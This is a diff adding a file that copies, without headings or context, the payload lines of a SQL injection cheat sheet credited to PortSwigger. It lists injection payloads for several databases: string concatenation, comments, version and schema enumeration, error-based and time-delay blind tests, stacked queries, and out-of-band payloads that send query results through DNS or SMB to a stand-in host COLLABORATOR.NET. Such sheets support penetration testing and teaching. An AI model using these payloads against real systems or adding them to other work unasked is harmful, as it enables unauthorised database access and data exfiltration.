@@ -1,0 +1,57 @@
+PortSwigger SQL injection Cheat Sheet
+'foo'||'bar'
+'foo'+'bar'
+'foo'||'bar'
+'foo' 'bar'
+CONCAT('foo','bar')
+SUBSTR('foobar', 4, 2)
+SUBSTRING('foobar', 4, 2)
+SUBSTRING('foobar', 4, 2)
+SUBSTRING('foobar', 4, 2)
+--comment
+--comment
+/*comment*/
+--comment
+/*comment*/
+#comment
+-- comment 
+/*comment*/
+SELECT banner FROM v$version
+SELECT version FROM v$instance
+SELECT @@version
+SELECT version()
+SELECT @@version
+SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
+SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
+QUERY-1-HERE; QUERY-2-HERE
+QUERY-1-HERE; QUERY-2-HERE
+QUERY-1-HERE; QUERY-2-HERE
+dbms_pipe.receive_message(('a'),10)
+WAITFOR DELAY '0:0:10'
+SELECT pg_sleep(10)
+SELECT SLEEP(10)
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLABORATOR.NET/"> %remote;]>'),'/l') FROM dual
+SELECT UTL_INADDR.get_host_address('COLLABORATOR.NET')
+exec master..xp_dirtree '//COLLABORATOR.NET/a'
+copy (SELECT '') to program 'nslookup COLLABORATOR.NET'
+LOAD_FILE('\\\\COLLABORATOR.NET\\a')
+SELECT ... INTO OUTFILE '\\\\COLLABORATOR.NET\a'
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.COLLABORATOR.NET/"> %remote;]>'),'/l') FROM dual
+declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.COLLABORATOR.NET/a"')
+SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\COLLABORATOR.NET\a'
+
